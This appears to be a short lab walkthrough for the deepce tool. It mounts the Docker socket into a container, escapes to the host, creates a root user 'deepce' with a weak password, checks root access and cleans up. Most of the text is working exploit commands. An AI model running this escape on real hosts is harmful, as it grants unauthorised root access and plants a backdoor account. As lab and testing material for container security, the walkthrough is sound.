# Setup

A container with the docker sock mounted inside has the ability to control docker and as a result can execute commands on the host machine. This allows us to escape the container and execute commands on the host machine as root.

1. Start a container with the docker sock file mounted
docker run -d -it --name deepce-container-escape1 -v /var/run/docker.sock:/var/run/docker.sock ubuntu

2. Copy deepce.sh into the container
docker cp /opt/deepce/deepce.sh deepce-container-escape1:/deepce.sh


# Exploit

- Go inside the container

docker exec -it deepce-container-escape1 /bin/bash
- Use deepce.sh to exploit the docker sock and create a new root user on the host machine

./deepce.sh -e SOCK -nn --install --username deepce --password deepce

You should now have a new root user on the host machine that you can login. Exit the container and switch users to confirm

exit
su deepce
id

Woop! Have a play with the other payloads and see what works :)

# Cleanup

If you wish to remove the new root user after exploitation, shut down the container and delete the user

docker stop deepce-container-escape1
docker rm deepce-container-escape1

userdel deepce


